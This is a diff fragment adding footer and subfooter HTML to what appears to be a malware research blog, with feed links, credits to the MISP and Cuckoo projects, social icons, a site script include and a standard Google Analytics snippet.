+                    <a href="http://malware2.dontneedcoffee.com/feed.xml"  title="Subscribe to RSS Feed">RSS</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/atom.xml"  title="Subscribe to Atom Feed">Atom</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware2.dontneedcoffee.com/sitemap.xml"  title="Sitemap for Google Webmaster Tools">sitemap.xml</a>
+                  </li>
+              
+              </ul>
+          </div><!-- /.large-4.columns -->
+
+
+          <div class="small-6 medium-3 large-3 columns">
+            
+              
+                <h5 class="shadow-black">Merci</h5>
+              
+            
+              
+            
+              
+            
+
+            <ul class="no-bullet shadow-black">
+            
+              
+                <li >
+                  <a href="http://malware2.dontneedcoffee.com"  title=""></a>
+                </li>
+            
+              
+                <li class="network-misp" >
+                  <a href="https://github.com/MISP" target="_blank"  title="MISP Project - Open Source Threat Intelligence Platform & Open Standards For Threat Information Sharing">MISP</a>
+                </li>
+            
+              
+                <li class="network-cuckoo" >
+                  <a href="https://cuckoosandbox.org/" target="_blank"  title="Automate Malware Analysis">Cuckoo</a>
+                </li>
+            
+            </ul>
+          </div><!-- /.large-3.columns -->
+        </div><!-- /.row -->
+
+      </div><!-- /#footer -->
+
+
+      <div id="subfooter">
+        <nav class="row">
+          <section id="subfooter-left" class="small-12 medium-6 columns credits">
+            
+          </section>
+
+          <section id="subfooter-right" class="small-12 medium-6 columns">
+            <ul class="inline-list social-icons">
+            
+              <li><a href="http://github.com/Kafeine" target="_blank" class="icon-github" title="Code and more..."></a></li>
+            
+              <li><a href="http://twitter.com/Kafeine" target="_blank" class="icon-twitter" title="Last tweets"></a></li>
+            
+            </ul>
+          </section>
+        </nav>
+      </div><!-- /#subfooter -->
+    </footer>
+
+	
+
+	
+
+
+<script src="http://malware2.dontneedcoffee.com/assets/js/javascript.min.js"></script>
+
+
+
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-3016897-22', 'auto');
+  ga('set', 'anonymizeIp', true);
+  ga('send', 'pageview');
+
+</script>
+
+
+
+
+
+
+
+
+</body>
+</html>
+
